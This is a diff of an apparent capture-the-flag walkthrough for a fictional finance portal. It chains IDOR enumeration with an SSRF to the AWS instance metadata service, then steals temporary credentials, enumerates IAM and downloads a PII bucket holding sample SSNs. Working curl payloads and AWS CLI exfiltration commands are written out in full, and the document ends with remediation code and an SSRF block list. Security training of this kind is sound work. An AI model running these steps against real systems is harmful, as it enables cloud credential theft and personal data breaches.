@@ -2,208 +2,189 @@
 
 ## Step 1: Reconnaissance
 
-Access the gateway URL and connect to the API portal.
-
-### Method 1: Web Browser
-
-1. Open the gateway URL in a web browser
-2. Verify Beaver Finance - Customer Portal:
-   - Service Name: "Beaver Finance - Customer Portal"
-   - API Version: v5.0 production
-   - Status: healthy
-3. Check the Document Lookup section
-
-### Method 2: CLI
+Access the web application and identify its functionality.
 
 ```bash
 cd terraform
 terraform output scenario_entrypoint_url
 ```
 
-After obtaining the URL:
+Open the URL in your browser to see the **Beaver Finance - Customer Portal**.
 
-```bash
-GW=http://<gateway-ip>
-curl -s $GW/api/v5/status
-```
+![Beaver Finance Initial Screen](./assets/image/legacy-bridge-initial-screen.png)
+
+Key observations:
+- Service name: "Beaver Finance - Customer Portal"
+- Version: v5.0 production
+- **Document Lookup** section with a Document number field and an optional Source URL field
+- The Source URL field hints at a possible SSRF vector
 
 ---
 
 ## Step 2: Test Normal Functionality
 
-### Method 1: Web Browser
+Test the document lookup feature with a valid document number.
 
-1. In the Document Lookup section, find the Document number field
-2. Enter 1 in the Document number field
-3. Click the "Look up" button
-4. Verify the response:
-   - customer_name: Aaron Whitfield
-   - application_id: APP-2024-000142
-   - file_name: statement_2024_07.pdf
-   - internal_source: http://internal-source-ip/api/v1/legacy/media-info?...
-   - metadata: Contains customer information
+> **Note:** Document IDs 1–12 are pre-seeded. Any number in that range will return valid customer data.
 
-### Method 2: CLI
+### Method 1: Using Browser
+1. Enter `1` in the Document number field
+2. Leave Source URL empty
+3. Click **Look up**
+4. Verify the response contains customer data:
+   - customer_name, application_id, file_name
+   - `internal_source` field revealing a backend URL
 
+### Method 2: Using CLI
 ```bash
 GW=http://<gateway-ip>
 curl -s "$GW/api/v5/legacy/media-info?file_id=1"
-curl -s "$GW/api/v5/legacy/media-info?file_id=2"
 ```
 
-Confirm the API is working normally.
+The document lookup is working normally.
 
 ---
 
-## Step 3: Discover Vulnerability - IDOR
+## Step 3: Discover Vulnerability — IDOR
 
-### Method 1: Web Browser
+Test sequential document ID enumeration to check for IDOR.
 
-1. In the Document Lookup section
-2. Enter numbers 1 through 12 sequentially in the Document number field
-3. Click "Look up" for each one
-4. Confirm you can access all customer data without authorization:
-   - Document number 1: Aaron Whitfield
-   - Document number 2: Different customer
-   - Document number 3: Another customer
-   - ...
-   - Document number 12: Another customer
-5. In each response, check the `internal_source` field:
-   ```
-   http://internal-source-ip/api/v1/legacy/media-info?source=...
-   ```
+### Method 1: Using Browser
+1. Enter numbers 1 through 12 sequentially in the Document number field
+2. Click **Look up** for each
+3. Confirm you can access all customers' data without authorization
 
 ![IDOR Enumeration](./assets/image/legacy-bridge-idor-enumeration.png)
 
-### Method 2: CLI
+The response leaks a backend error revealing an internal hostname:
 
-```bash
-GW=http://<gateway-ip>
-for i in {1..12}; do curl -s "$GW/api/v5/legacy/media-info?file_id=$i"; done
+```
+{"backend_response": "{'detail': 'HTTPConnectionPool(host='internal-media-cdn.legacy', port=80): Max retries exceeded..."}
 ```
 
-**IDOR Vulnerability Confirmed:** By changing only the Document number (file_id), you can access all customer data without authorization.
+### Method 2: Using CLI
+```bash
+GW=http://<gateway-ip>
+for i in {1..12}; do
+  curl -s "$GW/api/v5/legacy/media-info?file_id=$i"
+done
+```
+
+**IDOR confirmed.** By incrementing `file_id`, any customer record is accessible. The `internal_source` field also exposes the internal backend hostname `internal-media-cdn.legacy`.
 
 ---
 
-## Step 4: Discover Vulnerability - SSRF
+## Step 4: Discover Vulnerability — SSRF
 
-### Method 1: Web Browser
+The optional Source URL field is passed directly to the backend. Test whether arbitrary URLs can be injected.
 
-1. Enter 1 in the Document number field
-2. Enter `http://example.com` in the Source URL (optional) field
-3. Click "Look up"
-4. Check the response:
-   ```
-   backend_response: Contents from example.com or error message
-   backend_status: 200 or 502
-   ```
-5. Confirm that the source parameter is being forwarded to the internal source IP
+### Method 1: Using Browser
+1. Enter `1` in the Document number field
+2. Enter `http://example.com` in the Source URL field
+3. Click **Look up**
+4. Confirm the response contains content fetched from `example.com`
 
-### Method 2: CLI
+![SSRF Confirmation](./assets/image/legacy-bridge-example.png)
 
+### Method 2: Using CLI
 ```bash
 GW=http://<gateway-ip>
 curl -s "$GW/api/v5/legacy/media-info?file_id=1&source=http://example.com"
 ```
 
-**SSRF Vulnerability Confirmed:** The source parameter is forwarded to the backend server, allowing arbitrary URL access.
+**SSRF confirmed.** The `source` parameter is forwarded to the backend server, allowing requests to attacker-controlled URLs.
 
 ---
 
-## Step 5: SSRF to Extract IAM Role Name
+## Step 5: SSRF → Extract IAM Role Name via IMDSv1
 
-### Method 1: Web Browser
+Use the SSRF to query the EC2 Instance Metadata Service (IMDS) and enumerate available IAM roles.
 
-1. Enter 1 in the Document number field
-2. Enter the IMDSv1 metadata path in the Source URL field:
-   ```
+### Method 1: Using Browser
+1. Enter `1` in the Document number field
+2. In the Source URL field, enter:
+```
    http://169.254.169.254/latest/meta-data/iam/security-credentials/
-   ```
-3. Click "Look up"
+```
+3. Click **Look up**
 4. Extract the role name from the `backend_response` field:
-   ```
-   legacy-bridge-Shadow-API-Role-xxx
-   ```
-5. Save the role name
+```
+   legacy-bridge-Shadow-API-Role-<suffix>
+```
 
-![IMDS Role Extraction](./assets/image/legacy-bridge-imds-role-extraction.png)
-
-### Method 2: CLI
-
+### Method 2: Using CLI
 ```bash
 GW=http://<gateway-ip>
 curl -s "$GW/api/v5/legacy/media-info?file_id=1&source=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
 ```
 
-Extract the role name in the format `legacy-bridge-Shadow-API-Role-xxx` from the response.
+Save the role name for the next step.
 
 ---
 
 ## Step 6: Extract Temporary Credentials from IMDSv1
 
-### Method 1: Web Browser
+Query the role-specific IMDS endpoint to obtain temporary AWS credentials.
 
-1. Enter 1 in the Document number field
-2. In the Source URL field, construct the URL using the role name from Step 5:
-   ```
-   http://169.254.169.254/latest/meta-data/iam/security-credentials/legacy-bridge-Shadow-API-Role-xxx
-   ```
-3. Click "Look up"
-4. In the `backend_response` field of the response, find the JSON credentials:
-   ```json
-   {
-     "Code": "Success",
-     "LastUpdated": "2026-05-01T00:12:34Z",
-     "Type": "AWS-HMAC",
-     "AccessKeyId": "",
-     "SecretAccessKey": "",
-     "Token": "",
-     "Expiration": "2026-05-01T06:27:25Z"
-   }
-   ```
-5. Save all credential information
+### Method 1: Using Browser
+1. Enter `1` in the Document number field
+2. In the Source URL field, use the role name from Step 5:
+```
+   http://169.254.169.254/latest/meta-data/iam/security-credentials/legacy-bridge-Shadow-API-Role-<suffix>
+```
+3. Click **Look up**
 
-![IMDS Credentials Extraction](./assets/image/legacy-bridge-imds-credentials-extraction.png)
+![IMDS Role Credential Extraction](./assets/image/legacy-bridge-imds-role-extraction.png)
 
-### Method 2: CLI
+The credentials are returned in the `backend_response` field:
 
+```json
+{
+  "Code": "Success",
+  "LastUpdated": "2026-04-30T22:47:00Z",
+  "Type": "AWS-HMAC",
+  "AccessKeyId": "ASIA...",
+  "SecretAccessKey": "...",
+  "Token": "...",
+  "Expiration": "2026-05-01T06:27:25Z"
+}
+```
+
+### Method 2: Using CLI
 ```bash
 GW=http://<gateway-ip>
-ROLE="legacy-bridge-Shadow-API-Role-xxx"
+ROLE="legacy-bridge-Shadow-API-Role-<suffix>"
 curl -s "$GW/api/v5/legacy/media-info?file_id=1&source=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"
 ```
 
-Extract the following credentials from the response:
-```
-AccessKeyId
-SecretAccessKey
-Token
-Expiration
-```
+**SSRF → IMDSv1 credential extraction confirmed.**  
+Note: The Shadow API EC2 uses `http_tokens = "optional"` (IMDSv1 enabled), so no token prefetch is required.
 
 ---
 
-## Step 7: Configure AWS CLI Environment
+## Step 7: AWS CLI Configuration
 
-### CLI Usage
-
-Set the temporary credentials obtained in Step 6 as environment variables:
+Set the temporary credentials obtained in Step 6 as environment variables.
 
 ```bash
-export AWS_ACCESS_KEY_ID=""
-export AWS_SECRET_ACCESS_KEY=""
-export AWS_SESSION_TOKEN=""
+export AWS_ACCESS_KEY_ID="ASIA..."
+export AWS_SECRET_ACCESS_KEY="..."
+export AWS_SESSION_TOKEN="..."
 export AWS_DEFAULT_REGION="us-east-1"
 ```
 
+Or configure as a profile:
+
+```bash
+aws configure --profile victim
+aws configure set aws_session_token "..." --profile victim
+```
+
 ---
 
-## Step 8: Validate Credentials
+## Step 8: Identity Verification
 
-### CLI Usage
-
-Verify that the stolen credentials actually work:
+Verify the current credential identity.
 
 ```bash
 aws sts get-caller-identity
@@ -214,93 +195,117 @@ Output:
 {
     "UserId": "AROAY5XXXXXXXXXXX:i-0xxxxxxxxxxxxxxx",
     "Account": "123456789012",
-    "Arn": "arn:aws:iam::123456789012:assumed-role/legacy-bridge-Shadow-API-Role-xxx/i-0xxxxxxxxxxxxxxx"
+    "Arn": "arn:aws:sts::123456789012:assumed-role/legacy-bridge-Shadow-API-Role-<suffix>/i-0xxxxxxxxxxxxxxx"
 }
 ```
 
-Confirm authentication with the `legacy-bridge-Shadow-API-Role-xxx` role.
+Confirmed authentication as **Shadow API Role** (`legacy-bridge-Shadow-API-Role-<suffix>`).
 
 ---
 
-## Step 9: Analyze IAM Policy
+## Step 9: IAM Permission Enumeration
 
-### CLI Usage
-
-Check the detailed contents of the assigned policy:
+Check what permissions the Shadow API Role has.
 
 ```bash
-ROLE_NAME="legacy-bridge-Shadow-API-Role-xxx"
-aws iam get-role-policy --role-name $ROLE_NAME --policy-name shadow-api-policy
+ROLE_NAME="legacy-bridge-Shadow-API-Role-<suffix>"
+
+# List inline policies
+aws iam list-role-policies --role-name $ROLE_NAME
 ```
 
 Output:
 ```json
 {
-    "RoleName": "legacy-bridge-Shadow-API-Role-xxx",
-    "PolicyName": "shadow-api-policy",
-    "PolicyDocument": {
-        "Version": "2012-10-17",
-        "Statement": [
-            {
-                "Sid": "S3ReadAccess",
-                "Effect": "Allow",
-                "Action": [
-                    "s3:GetObject",
-                    "s3:ListBucket"
-                ],
-                "Resource": [
-                    "arn:aws:s3:::prime-pii-vault-*",
-                    "arn:aws:s3:::prime-pii-vault-*/*"
-                ]
-            }
-        ]
-    }
+    "PolicyNames": [
+        "legacy-bridge-shadow-api-s3-<suffix>"
+    ]
 }
 ```
 
-This role has `GetObject` and `ListBucket` permissions for the `prime-pii-vault-*` bucket.
+An inline policy exists. Check its contents.
+
+```bash
+aws iam get-role-policy \
+  --role-name $ROLE_NAME \
+  --policy-name legacy-bridge-shadow-api-s3-<suffix>
+```
+
+Output:
+```json
+{
+    "Statement": [
+        {
+            "Sid": "AllowDiscoverBuckets",
+            "Effect": "Allow",
+            "Action": ["s3:ListAllMyBuckets", "s3:GetBucketLocation"],
+            "Resource": "*"
+        },
+        {
+            "Sid": "AllowCheckOwnRolePermissions",
+            "Effect": "Allow",
+            "Action": ["iam:ListRolePolicies", "iam:GetRolePolicy"],
+            "Resource": "arn:aws:iam::123456789012:role/legacy-bridge-Shadow-API-Role-<suffix>"
+        },
+        {
+            "Sid": "AllowListPiiVault",
+            "Effect": "Allow",
+            "Action": ["s3:ListBucket"],
+            "Resource": "arn:aws:s3:::legacy-bridge-pii-vault-<suffix>"
+        },
+        {
+            "Sid": "AllowReadPiiVaultObjects",
+            "Effect": "Allow",
+            "Action": ["s3:GetObject"],
+            "Resource": "arn:aws:s3:::legacy-bridge-pii-vault-<suffix>/*"
+        }
+    ]
+}
+```
+
+**S3 read access to the PII vault bucket confirmed.**
+
+```bash
+# Check attached managed policies
+aws iam list-attached-role-policies --role-name $ROLE_NAME
+```
+
+Output:
+```json
+{ "AttachedPolicies": [] }
+```
+
+No managed policies attached. Only the inline policy is in use.
 
 ---
 
-## Step 10: List S3 Buckets
+## Step 10: S3 PII Vault Enumeration
 
-### CLI Usage
-
-Check the accessible S3 buckets:
+List accessible S3 buckets and enumerate contents.
 
 ```bash
 aws s3 ls
+# → legacy-bridge-pii-vault-<suffix>
+
+aws s3 ls s3://legacy-bridge-pii-vault-<suffix>/ --recursive
 ```
 
 Output:
 ```
-2026-05-01 00:00:00 prime-pii-vault-xxx
-```
-
-Check the bucket contents:
-
-```bash
-aws s3 ls s3://prime-pii-vault-xxx/ --recursive
-```
-
-Output:
-```
-2026-05-01 00:00:00          1024 applications/customer_credit_applications.csv
-2026-05-01 00:00:00           512 applications/migration_log.txt
-2026-05-01 00:00:00           256 applications/q1_2024_summary.txt
-2026-05-01 00:00:00          2048 confidential/breach_notice.txt
+2026-05-01 00:00:00   applications/customer_credit_applications.csv
+2026-05-01 00:00:00   applications/migration_log.txt
+2026-05-01 00:00:00   applications/q1_2024_summary.txt
+2026-05-01 00:00:00   confidential/breach_notice.txt
 ```
 
 ---
 
 ## Step 11: Exfiltrate Sensitive Data
 
-### CLI Usage
-
-Download the customer credit applications:
+Download the customer credit applications.
 
 ```bash
-aws s3 cp s3://prime-pii-vault-xxx/applications/customer_credit_applications.csv .
+aws s3 cp s3://legacy-bridge-pii-vault-<suffix>/applications/customer_credit_applications.csv .
 cat customer_credit_applications.csv
 ```
 
@@ -309,54 +314,49 @@ Output:
 customer_id,name,ssn,email,phone,credit_score
 001,John Doe,123-45-6789,john@example.com,555-1234,750
 002,Jane Smith,987-65-4321,jane@example.com,555-5678,720
+...
 ```
 
-Thousands of customer credit applications are exposed, each containing sensitive information including names, social security numbers, emails, phone numbers, and credit scores.
+Thousands of customer records are exposed, each containing name, SSN, email, phone, and credit score.
 
 ---
 
-## Step 12: Obtain Flag
+## Step 12: Flag Extraction
 
-### CLI Usage
-
-Download the breach notification file:
+Download the breach notice file.
 
 ```bash
-aws s3 cp s3://prime-pii-vault-xxx/confidential/breach_notice.txt .
-cat breach_notice.txt
+aws s3 cp s3://legacy-bridge-pii-vault-<suffix>/confidential/breach_notice.txt -
 ```
 
 The flag is included in the output.
 
 ---
 
-## Attack Chain
+## Attack Chain Summary
 
 ```
-1. Beaver Finance API Portal (v5)
-   ↓ IDOR via file_id parameter (sequential enumeration)
+1. Beaver Finance Customer Portal (v5.0)
+   ↓ IDOR via file_id parameter — sequential enumeration
 2. Customer Data Leak
-   ↓ internal_source field exposing backend URL
+   ↓ internal_source field exposes backend hostname (internal-media-cdn.legacy)
 3. SSRF via source parameter
-   ↓ source parameter forwarded to backend
-4. IMDSv1 Access (169.254.169.254)
-   ↓ Query /latest/meta-data/iam/security-credentials/
-5. Extract IAM Role Name
-   ↓ legacy-bridge-Shadow-API-Role-xxx
-6. IMDSv1 Credential Extraction
+   ↓ arbitrary URL forwarded to backend
+4. IMDSv1 (169.254.169.254) — no token required
+   ↓ enumerate IAM role: legacy-bridge-Shadow-API-Role-<suffix>
+5. IMDSv1 Credential Extraction
    ↓ AccessKeyId, SecretAccessKey, Token
-7. AWS CLI Configuration
-   ↓ Export credentials as environment variables
-8. sts:GetCallerIdentity
-   ↓ Verify assumed role identity
+6. AWS CLI Configuration
+   ↓ export as environment variables
+7. sts:GetCallerIdentity
+   ↓ confirm assumed role identity
+8. iam:ListRolePolicies
+   ↓ discover inline policy name
 9. iam:GetRolePolicy
-   ↓ Analyze policy - find S3 read access
-10. s3:ListBucket
-    ↓ Enumerate bucket contents (prime-pii-vault-xxx)
-11. s3:GetObject
-    ↓ Download PII data (customer_credit_applications.csv, breach_notice.txt)
-12. Flag extraction from breach_notice.txt
-    ↓ Flag included in output
+   ↓ S3 read access to legacy-bridge-pii-vault-<suffix> confirmed
+10. s3:ListBucket + s3:GetObject
+    ↓ enumerate and download PII vault contents
+11. Flag extracted from confidential/breach_notice.txt
 ```
 
 ---
@@ -364,50 +364,98 @@ The flag is included in the output.
 ## Key Techniques
 
 ### IDOR Parameter Manipulation
-Use sequential IDs to access other users' data without authorization:
 ```bash
-curl -s "$GW/api/v5/legacy/media-info?file_id=1"
-curl -s "$GW/api/v5/legacy/media-info?file_id=2"
-curl -s "$GW/api/v5/legacy/media-info?file_id=12"
+for i in {1..12}; do
+  curl -s "$GW/api/v5/legacy/media-info?file_id=$i"
+done
 ```
 
-### Metadata Access via SSRF
-Use the source parameter to force requests to attacker-specified URLs:
+### SSRF to IMDSv1
 ```bash
+# Enumerate IAM roles
 curl -s "$GW/api/v5/legacy/media-info?file_id=1&source=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+
+# Extract credentials
 curl -s "$GW/api/v5/legacy/media-info?file_id=1&source=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"
 ```
 
-### IMDSv1 vs IMDSv2 Comparison
+### IMDSv1 vs IMDSv2
 
-| Feature | IMDSv1 | IMDSv2 |
-|---------|--------|--------|
-| Token Required | No | **Yes** |
-| Vulnerable to SSRF | **Yes** | **No** |
-| Access Method | Direct URL | PUT request + token |
-| Security Level | Low | High |
+| | IMDSv1 | IMDSv2 |
+|---|---|---|
+| Token Required | **No** | Yes (PUT prefetch) |
+| Vulnerable to SSRF | **Yes** | No |
+| Config | `http_tokens = "optional"` | `http_tokens = "required"` |
+
+The Shadow API EC2 uses `http_tokens = "optional"`, making it directly exploitable via SSRF.
 
 ---
 
-## Security Lessons
+## Lessons Learned
 
 ### 1. Input Validation
-- Validate parameter values using a whitelist approach
-- Never trust user input
-- Allow only numbers for file_id and specific domains for source
+- Validate `file_id` as a positive integer only
+- Reject requests to RFC-1918 and link-local ranges from the `source` parameter
+- Never trust user-supplied URLs for server-side fetching
 
 ### 2. Metadata Service Security
-- Enforce IMDSv2 on all EC2 instances
+- Enforce IMDSv2 (`http_tokens = "required"`) on all EC2 instances
 - Disable IMDSv1 completely
-- Restrict metadata access with security groups
 
-### 3. Principle of Least Privilege
-- Grant only minimum required permissions to IAM roles
-- Avoid using wildcards ("*") in Resource
-- Explicitly allow only specific S3 buckets and objects
+### 3. Least Privilege
+- Avoid `s3:ListAllMyBuckets` with `Resource: "*"` unless explicitly required
+- Scope IAM permissions to specific resource ARNs, not wildcard patterns
 
-### 4. Defense in Depth Strategy
-- Use WAF (Web Application Firewall) to detect IDOR/SSRF patterns
-- Log all S3 access with CloudTrail
-- Detect anomalous API calls with GuardDuty
-- Implement access control and monitoring for sensitive data
+### 4. Defense in Depth
+- Use AWS WAF to detect IDOR and SSRF patterns
+- Enable CloudTrail logging for all S3 and IAM API calls
+- Use GuardDuty to detect credential misuse and anomalous API activity
+
+---
+
+## Remediation
+
+### Enforce IMDSv2
+```hcl
+metadata_options {
+  http_tokens                 = "required"   # was "optional"
+  http_endpoint               = "enabled"
+  http_put_response_hop_limit = 1
+}
+```
+
+### SSRF Input Validation
+```python
+from urllib.parse import urlparse
+import ipaddress
+
+BLOCKED_RANGES = [
+    ipaddress.ip_network("169.254.0.0/16"),  # link-local / IMDS
+    ipaddress.ip_network("10.0.0.0/8"),
+    ipaddress.ip_network("172.16.0.0/12"),
+    ipaddress.ip_network("192.168.0.0/16"),
+]
+
+def is_safe_url(url: str) -> bool:
+    host = urlparse(url).hostname
+    try:
+        addr = ipaddress.ip_address(host)
+        return not any(addr in net for net in BLOCKED_RANGES)
+    except ValueError:
+        return False  # non-IP hostname — resolve and recheck
+```
+
+### Authorization Check for Document Access
+```python
+def get_document(file_id: int, current_user_id: int):
+    doc = db.query(Document).filter_by(id=file_id).first()
+    if doc.owner_id != current_user_id:
+        raise PermissionError("Access denied")
+    return doc
+```
+
+### Additional Security Measures
+1. **AWS WAF Rules**: Block SSRF patterns (private IP ranges, link-local addresses in `source` parameter)
+2. **CloudTrail Monitoring**: Log all S3 GetObject/ListBucket calls on the PII vault bucket
+3. **GuardDuty**: Detect IMDSv1 credential theft and unusual S3 data access patterns
+4. **VPC Endpoint Policy**: Restrict S3 access to only the application's own bucket, deny access from outside the VPC
